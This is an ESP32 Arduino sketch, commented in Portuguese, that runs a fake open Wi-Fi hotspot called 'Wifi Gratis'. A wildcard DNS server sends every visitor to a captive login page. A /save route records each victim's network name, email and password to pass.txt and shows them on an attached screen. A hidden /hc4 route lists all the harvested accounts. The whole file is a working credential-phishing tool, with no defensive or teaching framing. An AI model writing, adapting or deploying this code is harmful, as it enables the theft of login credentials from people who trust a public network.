#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include <SPIFFS.h>
#include <TFT_eSPI.h>

TFT_eSPI tft = TFT_eSPI(); // <- Faltava ponto e vírgula aqui

const char *ssid = "Wifi Gratis";
const char *password = "";

// Inicialização do servidor web e DNS
AsyncWebServer server(80);
DNSServer dnsServer;

// Porta do servidor DNS
const byte DNS_PORT = 53;

// Função de callback para monitorar conexões de clientes
void WiFiEvent(WiFiEvent_t event)
{
  switch (event)
  {
  case SYSTEM_EVENT_AP_START:
    Serial.println("Access Point Iniciado");
    Serial.print("IP do AP: ");
    Serial.println(WiFi.softAPIP());
    break;
  case SYSTEM_EVENT_AP_STACONNECTED:
    Serial.println("Dispositivo conectado ao AP");
    break;
  case SYSTEM_EVENT_AP_STADISCONNECTED:
    Serial.println("Dispositivo desconectado do AP");
    break;
  default:
    break;
  }
}

void setup()
{

  tft.init();
  tft.setRotation(1);
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_WHITE);
  tft.setTextSize(2);
  tft.setCursor(10, 10);
  tft.print("Ponto de acesso iniciado.\n\n");
  tft.print("Nome: ");
  tft.print(ssid);

  Serial.begin(115200);

  // Iniciar o SPIFFS
  if (!SPIFFS.begin(true))
  {
    Serial.println("Erro ao montar o sistema de arquivos SPIFFS");
    return;
  }
  Serial.println("SPIFFS montado com sucesso");

  // Configurar o AP (Access Point)
  WiFi.softAP(ssid, password);

  // Registra eventos de WiFi
  WiFi.onEvent(WiFiEvent);

  // Iniciar o servidor DNS
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());

  // Rota para servir o arquivo index.html do SPIFFS
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request)
            { request->send(SPIFFS, "/index.html", "text/html"); });

  // Rota para capturar parâmetros e salvar no pass.txt
  server.on("/save", HTTP_GET, [](AsyncWebServerRequest *request)
            {
    if (request->hasParam("email") && request->hasParam("pass")) {
      String rede = request->getParam("rede")->value();
      String email = request->getParam("email")->value();
      String pass = request->getParam("pass")->value();
      String data = "\nrede="+rede +" | email=" + email + " | pass=" + pass + "\n";
      
      tft.print("\n\n");
      tft.print(data);

      // Abrir arquivo para adicionar
      File file = SPIFFS.open("/pass.txt", FILE_APPEND);
      if (file) {
        if (file.print(data)) {
          file.close();
          request->send(200, "text/plain", "Redirecionando...");
          Serial.println("Dados salvos em pass.txt: " + data);
        } else {
          request->send(500, "text/plain", "Redirecionando...............");
          Serial.println("Erro ao escrever em pass.txt");
        }
      } else {
        request->send(500, "text/plain", "Redirecionando...........................");
        Serial.println("Erro ao abrir pass.txt");
      }
    } else {
      request->send(400, "text/plain", "Redirecionando.......");
      Serial.println("Parâmetros faltando ao salvar dados");
    } });

  // Rota para exibir o conteúdo do pass.txt com título "Contas"
  server.on("/hc4", HTTP_GET, [](AsyncWebServerRequest *request)
            {
    File file = SPIFFS.open("/pass.txt", FILE_READ);
    if (file) {
      String fileContent;
      fileContent += "<h1>Contas</h1>"; // Título "Contas"
      fileContent += "<pre>";
      while (file.available()) {
        fileContent += file.readString();
      }
      fileContent += "</pre>";
      file.close();
      request->send(200, "text/html", fileContent);
      Serial.println("Conteúdo de pass.txt enviado com sucesso");
    } else {
      request->send(500, "text/plain", "Erro ao abrir o arquivo");
      Serial.println("Erro ao abrir pass.txt para leitura");
    } });

  // Redirecionar qualquer outra solicitação para a página principal
  server.onNotFound([](AsyncWebServerRequest *request)
                    { request->redirect("/"); });

  // Iniciar o servidor
  server.begin();
}

void loop()
{
  // Processar as solicitações DNS
  dnsServer.processNextRequest();
}